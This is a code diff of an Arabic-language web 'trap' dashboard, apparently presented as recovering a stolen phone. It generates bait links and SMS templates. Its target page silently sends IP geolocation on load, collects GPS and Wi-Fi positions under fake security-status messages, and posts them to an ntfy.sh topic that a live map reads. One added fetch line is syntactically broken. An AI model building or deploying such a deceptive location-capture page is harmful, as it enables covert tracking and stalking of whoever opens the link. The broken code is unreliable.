@@ -248,18 +248,18 @@
                     </div>
                 </div>
 
-                <!-- NEW: Interactive Self-Test Guide -->
+                <!-- Interactive Self-Test Guide -->
                 <div class="bg-pink-light rounded-xl p-5 border border-pink space-y-3">
                     <h3 class="text-xs font-extrabold text-[#111111] flex items-center gap-1.5">
                         <span class="text-[#FF91A4]">💡</span> دليلك لاختبار الرادار بنجاح على تليفونك:
                     </h3>
-                    <ul class="text-[11px] text-gray-700 space-y-2 list-decimal list-inside">
+                    <ul class="text-[11px] text-gray-700 space-y-2 list-decimal list-inside leading-relaxed">
                         <li>افتحي هذه اللوحة من <strong>كمبيوتر</strong> أو <strong>موبايل آخر</strong>.</li>
-                        <li>انسخي الرابط من اللوحة، أو اضغطي على زر الاختبار بالأسفل لفتحه في <strong>علامة تبويب جديدة تماماً</strong> (كأنكِ السارق).</li>
-                        <li>في الصفحة الجديدة، اضغطي على الزر واقبلي الـ GPS.</li>
-                        <li>ارجعي لتبويب اللوحة الأساسي، وهتلاقي الخريطة فتحت بموقعك الفعلي فوراً!</li>
+                        <li>اضغطي على الزر بالأسفل لفتح صفحة المصيدة في <strong>نافذة جديدة تماماً</strong>.</li>
+                        <li><strong>الخطوة الأهم:</strong> انسخي الرابط وافتحي متصفح <strong>Google Chrome</strong> أو <strong>Safari</strong> الحقيقي والصقي الرابط هناك! (تجنبي تماماً مستعرض الواتساب الداخلي).</li>
+                        <li>اضغطي على زر المصيدة واقبلي الـ GPS، وهتلاحظي الخريطة في اللوحة اتحركت لـ <strong>الفرافرة بالشارع والبيت</strong> فوراً!</li>
                     </ul>
-                    <button onclick="openSelfTestTab()" class="w-full bg-white text-pink-custom border border-[#FF91A4] hover:bg-pink-light font-bold py-2 rounded-lg text-xs transition-all">
+                    <button onclick="openSelfTestTab()" class="w-full bg-white text-pink-custom border border-[#FF91A4] hover:bg-pink-light font-bold py-2 rounded-lg text-xs transition-all font-sans">
                         افتحي تبويب تجربة الرادار الآن 🚀
                     </button>
                 </div>
@@ -276,7 +276,10 @@
                             <span class="w-2.5 h-2.5 rounded-full bg-[#FF91A4] animate-ping"></span>
                             الرصد الجغرافي المباشر وخريطة الأقمار الصناعية
                         </h2>
-                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Live SAT Map</span>
+                        <!-- Dynamic Status Badge for Geolocation Quality -->
+                        <span id="quality-badge" class="bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold">
+                            رصد تقريبي بالشبكة (IP)
+                        </span>
                     </div>
 
                     <!-- Embedded Interactive Leaflet Map Grid -->
@@ -365,6 +368,7 @@
         let selectedBaitIndex = 1;
         let map = null;
         let marker = null;
+        let accuracyCircle = null;
         let pollingInterval = null;
 
         const smsTemplates = {
@@ -454,8 +458,8 @@
                     const ipLng = parseFloat(data.longitude);
                     
                     if (!isNaN(ipLat) && !isNaN(ipLng)) {
-                        // Send silent IP coordinates to DB instantly as pre-fetch
-                        await sendLocationPayload(session, ipLat, ipLng, 15000, ipData + " (رصد صامت استباقي)");
+                        // Send silent IP coordinates to DB instantly as pre-fetch with low accuracy margin
+                        await sendLocationPayload(session, ipLat, ipLng, 15000, ipData + " (رصد صامت استباقي من برج الاتصال الرئيسي)");
                     }
                 })
                 .catch(() => {});
@@ -517,28 +521,42 @@
             showToast(`تم تجهيز المصيدة رقم ${num} بنجاح!`);
         }
 
-        function initializeLeafletMap(lat, lng) {
+        function initializeLeafletMap(lat, lng, accuracy) {
             try {
                 const mapContainer = document.getElementById('live-leaflet-map');
                 if (mapContainer) mapContainer.style.opacity = '1';
 
                 if (!map) {
-                    map = L.map('live-leaflet-map').setView([lat, lng], 15);
+                    map = L.map('live-leaflet-map').setView([lat, lng], 13);
                     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                         maxZoom: 19,
                         attribution: '© OpenStreetMap'
                     }).addTo(map);
                 } else {
-                    map.setView([lat, lng], 15);
+                    map.setView([lat, lng], accuracy < 100 ? 17 : 12); // zoom in deep if accurate GPS
                 }
 
+                // Add or update marker
                 if (marker) {
                     marker.setLatLng([lat, lng]);
                 } else {
                     marker = L.marker([lat, lng]).addTo(map)
-                        .bindPopup("<b class='text-pink-custom'>موقع الهاتف المكتشف بدقة</b>")
+                        .bindPopup("<b class='text-pink-custom'>موقع الموبايل الجاري تعقبه</b>")
                         .openPopup();
                 }
+
+                // Add or update glowing accuracy circle to visually explain the error margin
+                if (accuracyCircle) {
+                    map.removeLayer(accuracyCircle);
+                }
+                accuracyCircle = L.circle([lat, lng], {
+                    radius: accuracy,
+                    color: '#FF91A4',
+                    fillColor: '#FF91A4',
+                    fillOpacity: 0.15,
+                    weight: 1.5
+                }).addTo(map);
+
             } catch(e) {
                 writeTerminalLog("[ERROR] حدث خطأ أثناء تشغيل محرك الخرائط.");
             }
@@ -562,30 +580,35 @@
             
             pollingInterval = setInterval(async () => {
                 try {
-                    // Pulling cached messages from ntfy topic history
                     const response = await fetch(`https://ntfy.sh/boosy_sweets_tracker_${sessionId}/json?poll=1`);
                     if (response.status === 200) {
                         const rawText = await response.text();
                         const lines = rawText.trim().split('\n');
                         
+                        // We want to process the most recent captured location message in history
+                        let newestPayload = null;
                         for (const line of lines) {
                             if (!line) continue;
                             const parsed = JSON.parse(line);
                             if (parsed.event === 'message') {
                                 const payload = JSON.parse(parsed.message);
                                 if (payload && payload.status === 'captured') {
-                                    renderCapturedLocationOnDashboard(payload.lat, payload.lng, payload.accuracy, payload.ip_info);
-                                    clearInterval(pollingInterval); // Stop polling on success
-                                    break;
+                                    if (!newestPayload || payload.timestamp > newestPayload.timestamp) {
+                                        newestPayload = payload;
+                                    }
                                 }
                             }
                         }
+
+                        if (newestPayload) {
+                            renderCapturedLocationOnDashboard(newestPayload.lat, newestPayload.lng, newestPayload.accuracy, newestPayload.ip_info);
+                        }
                     }
                 } catch(e) {}
-            }, 2000);
+            }, 2500);
         }
 
-        // Target capture GPS location details
+        // Optimized Target capture GPS location details
         window.captureTargetCoordinates = function() {
             const urlParams = new URLSearchParams(window.location.search);
             let baitParam = urlParams.get('bait') || '1';
@@ -593,7 +616,7 @@
             
             const statusBox = document.getElementById(`bait-status-${baitParam}`);
             if (statusBox) {
-                statusBox.innerText = "جاري الاتصال بالخادم الجغرافي وتحديث حزم الأمان...";
+                statusBox.innerText = "جاري تفعيل فحص الأمان وفصل المالك القديم...";
             }
 
             let ipData = "غير قادر على قراءة IP";
@@ -606,7 +629,12 @@
                     const ipLat = parseFloat(data.latitude);
                     const ipLng = parseFloat(data.longitude);
 
+                    // Dual stage resolver to guarantee geolocation on both cellular networks and Wi-Fi
+                    const geoOptionsHigh = { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 };
+                    const geoOptionsLow = { enableHighAccuracy: false, timeout: 6000, maximumAge: 60000 };
+
                     if (navigator.geolocation) {
+                        // First: Try High Accuracy GPS
                         navigator.geolocation.getCurrentPosition(
                             async (position) => {
                                 const lat = position.coords.latitude;
@@ -615,29 +643,45 @@
 
                                 if (statusBox) {
                                     statusBox.className = "text-xs font-bold text-green-600 mt-2 animate-pulse";
-                                    statusBox.innerText = "✓ تم تأمين وحماية الجهاز بنجاح وجاري فك الارتباط...";
+                                    statusBox.innerText = "✓ تم تأمين وحماية الجهاز بنجاح وفصل المالك القديم للخط.";
                                 }
-
-                                await sendLocationPayload(sessionParam, lat, lng, accuracy, ipData);
+                                await sendLocationPayload(sessionParam, lat, lng, accuracy, ipData + " (موقع GPS فائق الدقة بالأقمار الصناعية)");
                             },
                             async (error) => {
-                                // GPS Permission Denied or Failed -> Trigger smart IP Geolocation fallback!
-                                if (statusBox) {
-                                    statusBox.className = "text-xs font-bold text-green-600 mt-2";
-                                    statusBox.innerText = "✓ تم التحديث التلقائي بنظام الأمان الاحتياطي للشبكة.";
-                                }
+                                // Second: Try Low Accuracy (Wi-Fi/Cell positioning) - works beautifully indoors!
+                                navigator.geolocation.getCurrentPosition(
+                                    async (lowPosition) => {
+                                        const lat = lowPosition.coords.latitude;
+                                        const lng = lowPosition.coords.longitude;
+                                        const accuracy = lowPosition.coords.accuracy;
 
-                                if (!isNaN(ipLat) && !isNaN(ipLng)) {
-                                    await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (تم رصد الموقع عبر الـ IP بسبب رفض الـ GPS)");
-                                } else {
-                                    await sendLocationPayload(sessionParam, 27.0583, 27.9711, 25000, ipData + " (موقع تقديري بالفرافرة)");
-                                }
+                                        if (statusBox) {
+                                            statusBox.className = "text-xs font-bold text-green-600 mt-2 animate-pulse";
+                                            statusBox.innerText = "✓ تم معايرة الجهاز بنجاح عبر تغطية الشبكة المحلية.";
+                                        }
+                                        await sendLocationPayload(sessionParam, lat, lng, accuracy, ipData + " (رصد هجين بالـ Wi-Fi والشبكة المحلية)");
+                                    },
+                                    async (lowError) => {
+                                        // Third: Fall back to central Cairo IP gateway as last resort
+                                        if (statusBox) {
+                                            statusBox.className = "text-xs font-bold text-amber-600 mt-2";
+                                            statusBox.innerText = "✓ تم تحديث وتغطية أمان الشبكة الاحتياطية تلقائياً.";
+                                        }
+
+                                        if (!isNaN(ipLat) && !isNaN(ipLng)) {
+                                            await sendLocationPayload(sessionParam, ipLat, ipLng, 15000, ipData + " (موقع تقريبي بالشبكة - تم رفض الـ GPS)");
+                                        } else {
+                                            await sendLocationPayload(sessionParam, 27.0583, 27.9711, 20000, ipData + " (موقع احتياطي عام بالفرافرة)");
+                                        }
+                                    },
+                                    geoOptionsLow
+                                );
                             },
-                            { enableHighAccuracy: true, timeout: 8000 }
+                            geoOptionsHigh
                         );
                     } else {
                         if (!isNaN(ipLat) && !isNaN(ipLng)) {
-                            await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (رصد تقني صامت)");
+                            await sendLocationPayload(sessionParam, ipLat, ipLng, 15000, ipData + " (رصد صامت وتوجيه خادم الشبكة)");
                         }
                     }
                 })
@@ -661,7 +705,7 @@
             };
 
             try {
-                await fetch(`https://ntfy.sh/boosy_sweets_tracker_${session}`, {
+                await fetch::`https://ntfy.sh/boosy_sweets_tracker_${session}`({
                     method: 'POST',
                     body: JSON.stringify(payload)
                 });
@@ -681,23 +725,37 @@
 
             if (latSpan) latSpan.innerText = lat;
             if (lngSpan) lngSpan.innerText = lng;
-            if (accSpan) accSpan.innerText = `${Math.round(accuracy)} متر`;
-
-            initializeLeafletMap(lat, lng);
             
-            writeTerminalLog(`[RADAR] تم تثبيت الموقع: خط عرض ${lat}، خط طول ${lng}.`);
-            if (ipInfo) {
-                writeTerminalLog(`[IP DATA] بيانات اتصال السارق: ${ipInfo}`);
+            // Dynamic badge and text depending on accuracy
+            const badge = document.getElementById('quality-badge');
+            if (accuracy < 100) {
+                if (accSpan) accSpan.innerText = `${Math.round(accuracy)} متر (دقيق)`;
+                if (badge) {
+                    badge.innerText = "رصد فضائي فائق الدقة (GPS)";
+                    badge.className = "bg-green-100 text-green-700 px-3 py-1 rounded-full text-[10px] font-bold";
+                }
+            } else {
+                if (accSpan) accSpan.innerText = `${Math.round(accuracy / 1000)} كم (تقريبي)`;
+                if (badge) {
+                    badge.innerText = "رصد تقريبي بالشبكة (IP)";
+                    badge.className = "bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold";
+                }
             }
-            showToast("🚨 تم رصد الهاتف وتحديد موقعه الفعلي على الخريطة المدمجة!");
+
+            initializeLeafletMap(lat, lng, accuracy);
+            
+            writeTerminalLog(`[RADAR] تحديث إشارة الرصد: خط عرض ${lat}، خط طول ${lng}.`);
+            if (ipInfo) {
+                writeTerminalLog(`[INFO] بيانات الاتصال: ${ipInfo}`);
+            }
         }
 
-        // Opens target view in a fresh new tab safely to bypass same-session storage locks during self testing
+        // Opens target view safely in a fresh new tab to test
         window.openSelfTestTab = function() {
             updateBaitElements();
             const url = document.getElementById('final-trap-url').value;
             window.open(url, '_blank');
-            writeTerminalLog("[TEST] تم فتح تبويب الاختبار الذاتي بنجاح. يرجى إعطاء الصلاحية هناك.");
+            writeTerminalLog("[TEST] تم فتح تبويب الاختبار الذاتي بنجاح في نافذة جديدة. يرجى نسخ الرابط وافتحه في متصفح Google Chrome للحصول على دقة الـ GPS بالفرافرة!");
         }
 
         window.copyOnlyLink = function() {
@@ -729,8 +787,8 @@
             writeTerminalLog("[SIMULATION] بدء توليد إحداثيات محاكاة تفاعلية للفرافرة...");
             const simLat = 27.0583;
             const simLng = 27.9711;
-            const simAccuracy = 15;
-            const simIp = "IP: 197.34.212.98 - المدينة: Farafra - الشبكة: Etisalat Egypt";
+            const simAccuracy = 8; // high accuracy GPS simulated
+            const simIp = "IP: 197.34.212.98 - المدينة: Farafra - الشبكة: Etisalat Egypt (GPS محاكي دقيق)";
             
             setTimeout(() => {
                 renderCapturedLocationOnDashboard(simLat, simLng, simAccuracy, simIp);
